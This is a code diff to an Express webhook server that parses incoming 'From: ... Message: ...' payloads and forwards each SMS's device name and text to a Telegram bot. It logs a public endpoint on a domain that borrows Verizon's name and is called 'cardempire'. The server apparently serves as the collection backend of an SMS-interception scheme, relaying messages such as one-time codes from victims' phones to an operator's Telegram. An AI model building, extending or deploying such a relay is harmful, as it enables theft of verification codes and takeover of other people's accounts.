@@ -36,29 +36,50 @@ app.get("/verify", (req, res) => {
     status: "ok", 
     message: "Verify endpoint is active. Send POST requests here.",
     method: "POST",
-    required_fields: ["message", "device_name"],
-    auth: "No authorization required (public endpoint)"
+    expected_format: {
+      content: "From: Sender's Name Message: actual message"
+    }
   });
 });
 
-// Main webhook endpoint - /verify (NO FILTERING, NO AUTH)
+// Main webhook endpoint - /verify
 app.post("/verify", async (req, res) => {
   try {
     // 1. Get data from request
-    const { message, device_name } = req.body;
+    const { content } = req.body;
     
     console.log("📨 Webhook request received");
-    console.log("📦 Data:", req.body);
+    console.log("📦 Raw content:", content);
     
-    // 2. Format Telegram message (NO FILTERING - everything goes through)
-    const deviceName = device_name || "Unknown Device";
+    if (!content) {
+      return res.status(400).json({ error: "Missing field: content" });
+    }
+
+    // 2. Parse the content: "From: Joseph's iPhone Message: hi lol"
+    let deviceName = "Unknown Device";
+    let message = content;
+    
+    // Check if it has the "From: ... Message: ..." format
+    const fromMatch = content.match(/^From:\s*(.+?)\s*Message:\s*(.*)$/is);
+    
+    if (fromMatch) {
+      deviceName = fromMatch[1].trim();
+      message = fromMatch[2].trim();
+    } else {
+      // Fallback: if format doesn't match, use the whole thing as message
+      message = content;
+    }
+    
+    console.log("🎯 Device:", deviceName);
+    console.log("✍️ Message:", message);
+
+    // 3. Format Telegram message
     const timestamp = new Date().toLocaleString();
-    
-    const telegramText = `📱 New SMS received 🍆💪\n\n🎯 ${deviceName}\n✍️ ${message || "No message content"}\n🕐 ${timestamp}`;
+    const telegramText = `📱 New SMS received 🍆💪\n\n🎯 ${deviceName}\n✍️ ${message}\n🕐 ${timestamp}`;
 
     console.log("📤 Sending to Telegram...");
 
-    // 3. Send to Telegram
+    // 4. Send to Telegram
     const telegramResponse = await fetch(TELEGRAM_API_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -82,10 +103,11 @@ app.post("/verify", async (req, res) => {
 
     console.log("✅ Telegram sent successfully!");
     
-    // 4. Success
+    // 5. Success
     res.json({ 
       success: true, 
-      message: "SMS forwarded to Telegram" 
+      message: "SMS forwarded to Telegram",
+      parsed: { deviceName, message }
     });
 
   } catch (error) {
@@ -103,6 +125,5 @@ app.post("/verify", async (req, res) => {
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`🚀 Webhook host running on port ${PORT}`);
   console.log(`📡 Endpoint: https://verizon.cardempire.org/verify`);
-  console.log(`🔓 No authorization required (public endpoint)`);
-  console.log(`📨 No filtering - all messages forwarded`);
+  console.log(`📨 Expects: {"content": "From: NAME Message: TEXT"}`);
 });
